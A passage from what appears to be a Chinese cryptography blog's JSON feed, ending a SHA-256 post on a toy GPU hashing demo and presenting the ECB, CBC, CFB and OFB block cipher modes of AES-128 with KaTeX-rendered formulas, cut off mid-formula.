data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0V0aGVyRHJlYW0=\">EtherDream</span> 编写的玩具版 “挖矿” 演示：给定 12 bytes 的数据 Q，要求找到另一串 4 bytes 的数据 A，使 Q+A 的 SHA-256 以 00000000 开头。尝试用你实现的 SHA-256 或各种标准库 / 第三方库来实现这一功能，并和 glminer 比较计算 SHA-256 的性能。查看<span class=\"exturl\" data-url=\"aHR0cHM6Ly92MmV4LmNvbS90LzM0NzAwNQ==\">在 V2EX 上的讨论</span>以及 glminer 的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXRoZXJkcmVhbS5jb20vRnVubnlTY3JpcHQvZ2xtaW5lci9tYWluLmpz\">源代码</span>，为什么会存在这样的性能差距？它是如何实现 SHA-256 计算的？</p>\n<h3 id=\"回答-4\"><a class=\"anchor\" href=\"#回答-4\">#</a> 回答</h3>\n<p>我没有尝试编写挖矿程序，但我看了 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXRoZXJkcmVhbS5jb20vRnVubnlTY3JpcHQvZ2xtaW5lci9tYWluLmpz\">glminer 源码</span>，它使用了自定义 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXRoZXJkcmVhbS5jb20vRnVubnlTY3JpcHQvZ2xtaW5lci9mc2hhZGVyLmM=\">着色器代码</span> 计算哈希，通过 WebGL 画图渲染触发 GPU 不断对尝试的随机数执行这个代码计算哈希值，实现挖矿的效果。</p>\n<p>它的代码能够用 GPU 以 2048 线程并行化加速，所以效果当然是比单线程程序要好很多的。</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "数学",
                "密码学",
                "密码学"
            ]
        },
        {
            "id": "https://taf.fyi/math/cryptography/aes-128/",
            "url": "https://taf.fyi/math/cryptography/aes-128/",
            "title": "AES-128",
            "date_published": "2024-11-20T16:00:00.000Z",
            "content_html": "<h1 id=\"加密模式处理\"><a class=\"anchor\" href=\"#加密模式处理\">#</a> 加密模式处理</h1>\n<h2 id=\"ecb\"><a class=\"anchor\" href=\"#ecb\">#</a> ECB</h2>\n<p>The Electronic Codebook Mode</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/19/YusVWnNSbeFIJ9T.png\" alt=\"\" width=\"67%\" /></p>\n<h2 id=\"cbc\"><a class=\"anchor\" href=\"#cbc\">#</a> CBC</h2>\n<p>The Cipher Block Chaining Mode</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/19/jPJTpYMD4QXai9A.png\" alt=\"\" width=\"67%\" /></p>\n<h2 id=\"cfb\"><a class=\"anchor\" href=\"#cfb\">#</a> CFB</h2>\n<p>The Cipher Feedback Mode</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/19/hV8KyidMoAIbLsc.png\" alt=\"\" width=\"67%\" /></p>\n<p><img data-src=\"https://s2.loli.net/2024/11/19/zhrgjk2tH1aoJSR.png\" alt=\"\" width=\"67%\" /></p>\n<p>这里只需要考虑 CFB-128bit，也就是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo>=</mo><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">s=b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span>，所以上述过程可以简化为如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left right left right left\" columnspacing=\"0em 1em 0em 1em 0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>CFB Encryption:</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><msub><mi>P</mi><mn>1</mn></msub><mo>⊕</mo><mi>C</mi><mi>I</mi><mi>P</mi><msub><mi>H</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><mi>I</mi><mi>V</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>C</mi><mi>j</mi></msub><mo>=</mo><msub><mi>P</mi><mi>j</mi></msub><mo>⊕</mo><mi>C</mi><mi>I</mi><mi>P</mi><msub><mi>H</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><msub><mi>C</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>for </mtext><mi>j</mi><mo>=</mo><mn>2</mn><mo>⋯</mo><mi>n</mi><mo separator=\"true\">;</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>CFB Decryption:</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>P</mi><mn>1</mn></msub><mo>=</mo><msub><mi>C</mi><mn>1</mn></msub><mo>⊕</mo><mi>C</mi><mi>I</mi><mi>P</mi><msub><mi>H</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><mi>I</mi><mi>V</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>P</mi><mi>j</mi></msub><mo>=</mo><msub><mi>C</mi><mi>j</mi></msub><mo>⊕</mo><mi>C</mi><mi>I</mi><mi>P</mi><msub><mi>H</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><msub><mi>C</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>for </mtext><mi>j</mi><mo>=</mo><mn>2</mn><mo>⋯</mo><mi>n</mi><mo separator=\"true\">;</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;\\text{CFB Encryption:}\n&amp;&amp;C_1=P_1\\oplus CIPH_K(IV)\\\\\n&amp;&amp;&amp;C_j=P_j\\oplus CIPH_K(C_{j-1}) &amp;&amp; \\text{for}\\ j=2\\cdots n;\\\\\\\\\n&amp;\\text{CFB Decryption:}\n&amp;&amp;P_1=C_1\\oplus CIPH_K(IV)\\\\\n&amp;&amp;&amp;P_j=C_j\\oplus CIPH_K(C_{j-1}) &amp;&amp; \\text{for}\\ j=2\\cdots n;\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:7.500000000000002em;vertical-align:-3.5000000000000018em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4em;\"><span style=\"top:-6em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.499999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.9999999999999982em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.4999999999999982em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.7763568394002505e-15em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5000000000000018em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4em;\"><span style=\"top:-6.16em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">CFB Encryption:</span></span></span></span><span style=\"top:-4.659999999999999em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:-1.6599999999999984em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">CFB Decryption:</span></span></span></span><span style=\"top:-0.15999999999999837em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5000000000000018em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4em;\"><span style=\"top:-6em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.499999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.4999999999999982em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.7763568394002505e-15em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5000000000000018em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4em;\"><span style=\"top:-6.16em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mclose\">)</span></span></span><span style=\"top:-4.659999999999999em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:-1.6599999999999984em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mclose\">)</span></span></span><span style=\"top:-0.15999999999999837em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5000000000000018em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.5em;\"><span style=\"top:-4.5em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:0em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.5em;\"><span style=\"top:-4.66em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">for</span></span><span class=\"mspace\"> </span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mpunct\">;</span></span></span><span style=\"top:-0.16000000000000014em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">for</span></span><span class=\"mspace\"> </span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mpunct\">;</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<h2 id=\"ofb\"><a class=\"anchor\" href=\"#ofb\">#</a> OFB</h2>\n<p>The Output Feedback Mode</p>\n<p>最后一个分组 block 长度可以小于 128 bit，这里假定其长度为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>u</mi></mrow><annotation encoding=\"application/x-tex\">u</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">u</span></span></span></span>。</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/19/1iaR5dYprhomtDT.png\" alt=\"\" /></p>\n<p>我消去 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi></mrow><annotation encoding=\"application/x-tex\">I</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span></span></span></span>，仅用 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>O</mi></mrow><annotation encoding=\"application/x-tex\">O</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span></span></span></span> 表示密钥流的变化，更加直观：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left right left right left\" columnspacing=\"0em 1em 0em 1em 0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>OFB Encryption:</mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>O</mi><mn>1</mn></msub><mo>=</mo><mi>C</mi><mi>I</mi><mi>P</mi><msub><mi>H</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><mi>I</mi><mi>V</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" 